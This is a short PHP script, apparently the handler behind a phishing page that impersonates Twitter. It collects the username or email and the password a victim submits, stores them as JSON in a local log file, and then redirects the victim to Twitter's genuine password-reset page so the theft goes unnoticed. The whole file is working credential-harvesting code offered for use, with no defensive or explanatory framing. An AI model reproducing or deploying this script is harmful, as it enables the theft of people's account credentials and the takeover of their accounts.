<?php


header('Location: https://twitter.com/account/begin_password_reset');
$data = array('site' => 'Twitter',
  'user' => $_POST['usernameOrEmail'],
  'pass' => $_POST['pass']);

  $json_data = json_encode($data);

  $f = fopen('../../../logs/info.txt', 'w+');
  fwrite($f, $json_data);
  fclose($f);
exit();
?>